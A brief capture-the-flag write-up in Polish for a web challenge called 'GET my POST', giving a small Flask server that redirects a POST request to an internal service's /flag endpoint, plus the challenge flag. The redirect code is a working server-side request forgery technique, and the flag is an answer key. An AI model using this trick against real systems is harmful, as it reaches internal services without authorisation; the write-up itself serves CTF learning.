# GET my POST - web

### Solution

URL który przekierowywuje na internal serwis (`internal:5001/flag`)

```python=
from flask import Flask, make_response, redirect

app = Flask(__name__)

@app.route("/", methods=["POST"])
def main():
  return redirect("http://internal:5001/flag")

if __name__ == "__main__":
  app.run(port=5005)
```

Flaga: `ecsc25{indirect_route}`
